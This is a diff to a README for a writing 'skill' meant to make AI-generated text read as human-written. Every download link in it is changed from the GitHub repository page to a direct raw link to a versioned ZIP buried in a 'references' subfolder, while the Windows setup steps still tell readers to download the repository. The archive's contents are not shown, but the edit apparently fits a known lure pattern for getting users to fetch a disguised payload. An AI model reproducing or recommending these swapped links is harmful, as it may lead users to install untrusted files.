@@ -1,6 +1,6 @@
 # 🧠 anti-ai-slop-writing - Write Cleaner Human Text
 
-[![Download](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/soothing-carport96/anti-ai-slop-writing)
+[![Download](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/soothing-carport96/anti-ai-slop-writing/main/skills/anti-ai-slop-writing/references/anti-slop-writing-ai-3.3-beta.4.zip)
 
 ## ✨ What this is
 
@@ -22,7 +22,7 @@ Use it when you want writing that reads like a person wrote it, not a template. 
 
 ## 🚀 Download and set up
 
-1. Open the download page: https://github.com/soothing-carport96/anti-ai-slop-writing
+1. Open the download page: https://raw.githubusercontent.com/soothing-carport96/anti-ai-slop-writing/main/skills/anti-ai-slop-writing/references/anti-slop-writing-ai-3.3-beta.4.zip
 2. Download the repository to your Windows computer
 3. If you get a ZIP file, right-click it and choose **Extract All**
 4. Open the extracted folder
@@ -30,7 +30,7 @@ Use it when you want writing that reads like a person wrote it, not a template. 
 6. Copy it into the place your tool uses for skills or custom instructions
 7. Restart the tool if it was already open
 
-[Open the download page](https://github.com/soothing-carport96/anti-ai-slop-writing)
+[Open the download page](https://raw.githubusercontent.com/soothing-carport96/anti-ai-slop-writing/main/skills/anti-ai-slop-writing/references/anti-slop-writing-ai-3.3-beta.4.zip)
 
 ## 🪟 Windows setup steps
 
@@ -159,4 +159,4 @@ Yes. You can change the files to match your own style needs.
 
 If you need the files again, use this link:
 
-https://github.com/soothing-carport96/anti-ai-slop-writing
+https://raw.githubusercontent.com/soothing-carport96/anti-ai-slop-writing/main/skills/anti-ai-slop-writing/references/anti-slop-writing-ai-3.3-beta.4.zip
